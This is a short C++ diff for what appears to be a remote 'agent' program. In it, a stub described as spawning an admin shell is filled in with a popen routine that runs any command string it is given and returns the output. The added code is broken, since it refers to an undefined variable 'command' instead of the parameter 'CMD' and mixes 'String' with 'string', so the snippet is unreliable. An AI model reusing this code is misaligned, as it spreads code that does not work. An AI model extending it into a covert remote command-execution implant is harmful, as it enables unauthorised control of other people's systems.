@@ -1,3 +1,5 @@
+
+
 bool debug = true;
 
 enum State { //The current state of the agent
@@ -92,8 +94,21 @@ protected:
     }
 
     string doOS_CMD(String CMD){
-        //spawn an admin shell with the command
-        //when it finishes return the result
+        std::string result;
+        FILE* pipe = popen(command.c_str(), "r");
+        if (!pipe) throw std::runtime_error("popen() failed!");
+
+        char buffer[128];
+        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
+            result += buffer;
+        }
+
+        int returnCode = pclose(pipe);
+        if (returnCode != 0) {
+            throw std::runtime_error("Command execution failed with code: " + std::to_string(returnCode));
+        }
+
+        return result;
     }
 
     string doEnvoyCMD(String CMD){
